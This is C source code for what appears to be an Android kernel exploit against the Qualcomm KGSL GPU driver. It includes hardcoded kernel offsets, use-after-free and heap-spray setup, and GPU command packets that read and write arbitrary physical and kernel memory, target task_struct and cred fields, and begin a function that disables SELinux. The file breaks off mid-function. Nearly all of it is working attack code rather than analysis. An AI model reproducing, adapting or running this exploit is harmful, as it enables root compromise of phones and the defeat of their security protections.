#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/resource.h>

// ==================== РЕАЛЬНЫЕ СМЕЩЕНИЯ ДЛЯ ВАШЕГО ЯДРА ====================
#define KERNEL_BASE          0xffffffc03d000000ULL
#define SELINUX_OFFSET       0x0000000002f74ce8ULL
#define INIT_TASK_OFFSET     0x00000000024d90d0ULL

#define OFFSET_PID           0x650
#define OFFSET_TGID          0x658
#define OFFSET_COMM          0x818
#define OFFSET_CRED          0x6b0
#define OFFSET_REAL_CRED     0x6b8
#define OFFSET_TASKS         0x3f0
#define OFFSET_FLAGS         0x00
#define OFFSET_STACK         0x08

#define TASK_PHYS           0x00000000000001f0ULL
#define PAGE_SIZE            4096
#define UAF_START            0x7001FF000ULL
#define UAF_SIZE             0x10004000ULL
#define UAF_SCAN_SIZE        0x04000000ULL
#define SCAN_PAGE_STEP       2U
#define SCAN_MAX_PAGES       1024U
#define SCAN_PROGRESS_EVERY  128U
#define OVERLAP_START        0x7001FE000ULL
#define OVERLAP_SIZE         0x00007000ULL
#define PLACEH_START         0x710204000ULL
#define PLACEH_SIZE          0x00010000ULL
#define BOGUS_START          0x700204000ULL
#define WRAP_SIZE            0xFFFFFFFFFFEFD000ULL

#define MARKER_NAME "KETO0422"
#define MAX_FOUND_PAGES 10

#define GBUF_TASK_VA         0xb08
#define GBUF_CRED_PTR        0xb10
#define GBUF_REAL_CRED_PTR   0xb18
#define GBUF_TARGET_PID      0x40
#define GBUF_FOUND_PID       0x300
#define GBUF_SET_TASKS       0x200
#define GBUF_SECOND_CHILD    0x900
#define GBUF_CALL_LOGLINE    0xff0
#define GBUF_CUR_PID         0xfa0
#define GBUF_MMAP_CORRUPT    0x9f8
#define GBUF_EX_OVER         0xffc
#define GBUF_TASK_SPRAY      0x901
#define GBUF_PTE_SAVE        0xf00
#define GBUF_MMAP_CHECK      0xa00
#define GBUF_LIB_BASE        0x400
#define GBUF_SHELLCODE_ADDR  0x500

char *gbuf;
int fd;
int fd2;
int fd_lib;
int fd_shellcode;
struct stat st;
char check_flag[100] = {0};
unsigned long long gb_target_addr;
uint64_t selinux_enforcing;
uint64_t kernel_base = 0;
unsigned int g_uaf_id = 0;
uint64_t g_uaf_mmapsize = 0;
void *g_uaf_mmap_ptr = NULL;
uint64_t g_shellcode_va = 0;

static void flush_icache(void *addr, size_t len)
{
    __builtin___clear_cache((char *)addr, (char *)addr + len);
    __sync_synchronize();
}

static uint64_t find_kernel_base_from_task_va(uint64_t task_va);
static uint64_t find_offsets_auto(uint64_t kernel_base);
static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int data_size, int comm_off,
                                       uint64_t *out_cred_ptr, uint64_t *out_real_cred_ptr);
static uint64_t get_kernel_base(void);
#define WAIT_STEP_US 1000
#define WAIT_TIMEOUT_MS 300000

static int wait_for_flag_u8(volatile uint8_t *ptr, uint8_t value, unsigned int timeout_ms)
{
    unsigned int waited = 0;
    while (*ptr != value && waited < timeout_ms)
    {
        if (waited % 10000 == 0 && waited > 0) {
            fprintf(stderr, "[WAIT] Still waiting for flag (0x%x), elapsed: %u ms\n", value, waited);
        }
        usleep(WAIT_STEP_US);
        waited += WAIT_STEP_US / 1000;
    }
    return *ptr == value;
}

static int wait_for_flag_u64(volatile uint64_t *ptr, uint64_t value, unsigned int timeout_ms)
{
    unsigned int waited = 0;
    while (*ptr != value && waited < timeout_ms)
    {
        usleep(WAIT_STEP_US);
        waited += WAIT_STEP_US / 1000;
    }
    return *ptr == value;
}

uint8_t sig_num[] = {1, 3, 5, 7, 9};

#define KGSL_IOC_TYPE 0x09
#define FINDING 10
#define SPRAY_COUNT 3000
#define SPRAY_COUNT_STEP 500
#define SPRAY_COUNT_MAX 10000
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR 0x00000002U

typedef struct
{
    pid_t pid;
    volatile int do_action;
    volatile int ready;
} spray_slot_t;

static spray_slot_t *spray_ctrl;
static int spray_count = SPRAY_COUNT;
static int spray_actual = 0;

static int check_memory_available(void)
{
    FILE *fp = fopen("/proc/meminfo", "r");
    if (!fp)
        return 1;

    char line[256];
    unsigned long free_kb = 0;
    while (fgets(line, sizeof(line), fp))
    {
        if (strncmp(line, "MemAvailable:", 13) == 0)
        {
            sscanf(line + 13, "%lu", &free_kb);
            break;
        }
    }
    fclose(fp);

    fprintf(stderr, "[MEM] Available: %lu KB\n", free_kb);
    return free_kb >= 200000;
}

static int ensure_pid_in_spray_ctrl(pid_t pid)
{
    if (pid <= 0)
        return 0;

    int limit = (spray_actual > 0) ? spray_actual : spray_count;
    for (int i = 0; i < limit; i++)
    {
        if (spray_ctrl[i].pid == pid)
            return 1;
    }

    if (kill(pid, 0) != 0)
        return 0;

    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    FILE *f = fopen(path, "r");
    if (!f)
        return 0;
    char comm[128] = {0};
    if (fgets(comm, sizeof(comm), f) == NULL)
    {
        fclose(f);
        return 0;
    }
    fclose(f);
    if (strstr(comm, MARKER_NAME) == NULL)
        return 0;

    for (int i = 0; i < limit; i++)
    {
        if (spray_ctrl[i].pid <= 0)
        {
            spray_ctrl[i].pid = pid;
            spray_ctrl[i].do_action = 1;
            spray_ctrl[i].ready = 1;
            fprintf(stderr, "      [!!!] Dynamically added PID %d to spray_ctrl slot %d\n", pid, i);
            return 1;
        }
    }

    return 0;
}

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_free
{
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
};

struct kgsl_map_user_mem
{
    int fd;
    unsigned long gpuaddr;
    size_t len;
    size_t offset;
    unsigned long hostptr;
    unsigned int memtype;
    unsigned int flags;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)

#define DEV_PATH "/dev/kgsl-3d0"

typedef struct
{
    int fd;
    volatile int ready;
    volatile int bogus_started;
    volatile int result;
    volatile int saved_errno;
} race_state_t;

#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73

#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

struct kgsl_drawctxt_create
{
    unsigned flags, drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    unsigned int drawctxt_id;
};

#define IOCTL_KGSL_DRAWCTXT_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

struct kgsl_command_object
{
    uint64_t offset, gpuaddr, size;
    unsigned flags, id;
};

struct kgsl_gpu_command
{
    uint64_t flags, cmdlist;
    unsigned cmdsize, numcmds;
    uint64_t objlist;
    unsigned objsize, numobjs;
    uint64_t synclist;
    unsigned syncsize, numsyncs, context_id, timestamp;
};

struct kgsl_cmdstream_readtimestamp_ctxtid
{
    unsigned context_id, type, timestamp;
};

struct kgsl_gpuobj_info
{
    uint64_t gpuaddr, flags, size, va_len, va_addr;
    unsigned id;
};

#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID \
    _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
{
    return (0x9669u >> (0xFu & (val ^ (val >> 4) ^ (val >> 8) ^ (val >> 12) ^
                                (val >> 16) ^ (val >> 20) ^ (val >> 24) ^ (val >> 28)))) &
           1u;
}

#define MMAP_SPRAY_COUNT 4000
#define MMAP_SPRAY_STRIDE 0x200000ULL
#define MMAP_SPRAY_BASE 0x0000000200000000ULL

#define PAGE_SHIFT 12
#define PAGE_MASK (~(PAGE_SIZE - 1))
#define PMD_SHIFT 21
#define PGDIR_SHIFT 30
#define PTRS_PER_PTE 512
#define PTRS_PER_PMD 512
#define PTRS_PER_PGD 512
#define PHYS_MASK ((1ULL << 48) - 1)

typedef struct
{
    uint64_t pgd;
} pgd_t;
typedef struct
{
    uint64_t pmd;
} pmd_t;
typedef struct
{
    uint64_t pte;
} pte_t;

#define pgd_index(addr) (((addr) >> PGDIR_SHIFT) & (PTRS_PER_PGD - 1))
#define pmd_index(addr) (((addr) >> PMD_SHIFT) & (PTRS_PER_PMD - 1))
#define pte_index(addr) (((addr) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1))

#define pgd_val(x) ((x).pgd)
#define pmd_val(x) ((x).pmd)
#define pte_val(x) ((x).pte)

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28) | ((cnt & 0x3FFFu) << 0) | (pm4_calc_odd_parity_bit(cnt) << 15) | ((opcode & 0x7Fu) << 16) | (pm4_calc_odd_parity_bit(opcode) << 23);
}

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
{
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

static int wait_timestamp(int fd, unsigned ctx_id, unsigned target)
{
    struct kgsl_cmdstream_readtimestamp_ctxtid r = {0};
    r.context_id = ctx_id;
    r.type = KGSL_TIMESTAMP_RETIRED;

    for (unsigned spins = 0; spins < 100000; ++spins)
    {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0)
            return -1;
        if (r.timestamp >= target)
            return 0;
        usleep(100);
    }
    return -2;
}

static void *mmap_gpuobj_fixed(int fd, unsigned int id, uint64_t mmapsize, void *fixed_addr)
{
    off_t offset = ((off_t)id) << 12;
    size_t len = mmapsize;
    void *p = mmap(fixed_addr, len, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd, offset);
    return p;
}

static int gpu_write_phys(int fd, uint64_t phys_addr, uint32_t value)
{
    if (fd < 0)
    {
        fprintf(stderr, "[GPU_WRITE] Invalid fd: %d\n", fd);
        return -1;
    }

    fprintf(stderr, "[GPU_WRITE] start phys=0x%lx value=0x%x\n", (unsigned long)phys_addr, value);

    unsigned ctx_id = 0, ib_id = 0;
    uint64_t ib_gpu = 0;
    void *ib_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "[GPU_WRITE] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "[GPU_WRITE] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_WRITE] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    uint32_t d_lo, d_hi;
    split64(phys_addr, &d_lo, &d_hi);
    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
    cmd[dw++] = d_lo;
    cmd[dw++] = d_hi;
    cmd[dw++] = value;

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        result = 0;
        fprintf(stderr, "[GPU_WRITE] success phys=0x%lx value=0x%x\n", (unsigned long)phys_addr, value);
    }
    else
    {
        fprintf(stderr, "[GPU_WRITE] failed phys=0x%lx value=0x%x\n", (unsigned long)phys_addr, value);
    }

cleanup:
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ctx_id)
    {
        struct kgsl_drawctxt_destroy dctx;
        dctx.drawctxt_id = ctx_id;
        ioctl(fd, _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy), &dctx);
    }

    return result;
}

static int gpu_write_phys_64(int fd, uint64_t phys_addr, uint64_t value)
{
    int ret = 0;
    ret |= gpu_write_phys(fd, phys_addr, (uint32_t)(value & 0xffffffff));
    ret |= gpu_write_phys(fd, phys_addr + 4, (uint32_t)(value >> 32));
    return ret;
}

static int gpu_read_phys(int fd, uint64_t phys_addr, uint8_t *buffer, size_t size)
{
    if (fd < 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Invalid fd: %d\n", fd);
        return -1;
    }

    fprintf(stderr, "[GPU_READ_PHYS] start phys=0x%lx size=%zu\n", (unsigned long)phys_addr, size);

    if (size > 4096)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Size too large: %zu, limiting to 4096\n", size);
        size = 4096;
    }

    unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 4,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ_PHYS] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] DST alloc failed\n");
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ_PHYS] DST mmap failed\n");
        goto cleanup;
    }

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);
    memset(dst_vma, 0, dst_alloc.mmapsize);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    int dwords = size / 4;
    if (dwords > 256)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Too many dwords: %d, limiting to 256\n", dwords);
        dwords = 256;
    }

    for (int i = 0; i < dwords; i++)
    {
        uint32_t d_lo, d_hi, s_lo, s_hi;
        split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
        split64(phys_addr + (uint64_t)i * 4, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
    }

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
        memcpy(buffer, dst_vma, size);
        result = 0;
        fprintf(stderr, "[GPU_READ_PHYS] success phys=0x%lx size=%zu first8=0x%lx\n", 
                (unsigned long)phys_addr, size,
                size >= 8 ? (unsigned long)*(uint64_t *)buffer : 0UL);
    }
    else
    {
        fprintf(stderr, "[GPU_READ_PHYS] failed phys=0x%lx size=%zu\n", (unsigned long)phys_addr, size);
    }

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED)
        munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (dst_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }

    return result;
}

static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_t size)
{
    if (fd < 0)
    {
        fprintf(stderr, "[GPU_READ] Invalid fd: %d\n", fd);
        return -1;
    }

    if (size > 4096)
    {
        fprintf(stderr, "[GPU_READ] Size too large: %zu, limiting to 4096\n", size);
        size = 4096;
    }

    unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "[GPU_READ] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 4,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ] DST alloc failed\n");
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ] DST mmap failed\n");
        goto cleanup;
    }

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);
    memset(dst_vma, 0, dst_alloc.mmapsize);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    int dwords = size / 4;
    if (dwords > 256)
    {
        fprintf(stderr, "[GPU_READ] Too many dwords: %d, limiting to 256\n", dwords);
        dwords = 256;
    }

    for (int i = 0; i < dwords; i++)
    {
        uint32_t d_lo, d_hi, s_lo, s_hi;
        split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
        split64(task_va + (uint64_t)i * 4, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
    }

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
        memcpy(buffer, dst_vma, size);
        result = 0;
        fprintf(stderr, "[GPU_READ] Successfully read %zu bytes from 0x%lx\n", size, (unsigned long)task_va);
    }
    else
    {
        fprintf(stderr, "[GPU_READ] GPU command failed for 0x%lx\n", (unsigned long)task_va);
    }

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED)
        munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (dst_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }

    if (ctx_id)
    {
        struct kgsl_drawctxt_destroy dctx;
        dctx.drawctxt_id = ctx_id;
        ioctl(fd, _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy), &dctx);
    }

    return result;
}

static int gpu_write_task_virt(int fd, uint64_t dst_va, uint8_t *buffer, size_t size)
{
    if (fd < 0)
        return -1;

    if (size > 4096)
        size = 4096;

    unsigned ctx_id = 0, ib_id = 0;
    uint64_t ib_gpu = 0;
    void *ib_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
        return -1;
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {.size = PAGE_SIZE * 4, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
        goto cleanup;
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
        goto cleanup;

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    int dwords = (size + 3) / 4;
    if (dwords > 256)
        dwords = 256;

    for (int i = 0; i < dwords; i++)
    {
        uint32_t val = 0;
        uint32_t d_lo, d_hi;
        if (i * 4 < size)
            memcpy(&val, buffer + i * 4, sizeof(val));
        split64(dst_va + (uint64_t)i * 4, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = val;
    }

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {.gpuaddr = ib_gpu, .size = ib_bytes, .flags = KGSL_CMDLIST_IB, .id = ib_id};
    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 && wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        __sync_synchronize();
        usleep(100000);
        result = 0;
        fprintf(stderr, "[GPU_WRITE] CP_MEM_WRITE submitted OK for 0x%lx\n", (unsigned long)dst_va);
    }

cleanup:
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ctx_id)
    {
        struct kgsl_drawctxt_destroy dctx;
        dctx.drawctxt_id = ctx_id;
        ioctl(fd, _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy), &dctx);
    }

    return result;
}

static int gpu_write_task_u32(int fd, uint64_t dst_va, uint32_t value)
{
    uint8_t buf[4];
    memcpy(buf, &value, 4);
    return gpu_write_task_virt(fd, dst_va, buf, 4);
}

static int gpu_write_task_64(int fd, uint64_t dst_va, uint64_t value)
{
    uint8_t buf[8];
    memcpy(buf, &value, 8);
    return gpu_write_task_virt(fd, dst_va, buf, 8);
}

static int gpu_write_bytes(int fd, uint64_t dst_va, void *src_data, size_t size)
{
    if (size == 0 || size > 4096)
        return -1;
    return gpu_write_task_virt(fd, dst_va, (uint8_t *)src_data, size);
}

static int gpu_read_u32(int fd, uint64_t src_va, uint32_t *value)
{
    uint32_t tmp = 0;
    if (gpu_read_task_struct(fd, src_va, (uint8_t *)&tmp, sizeof(tmp)) != 0)
        return -1;
    *value = tmp;
    return 0;
}

static int disable_selinux_via_gpu(int fd)
{
    if (kernel_base == 0)
        return -1;

    if (selinux_enforcing == 0)
    {
        uint64_t auto_offset = find_offsets_auto(kernel_base);
        selinux_enforcing = kernel_base + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
    }

    if (selinux_enforcing == 0)
        return -1;

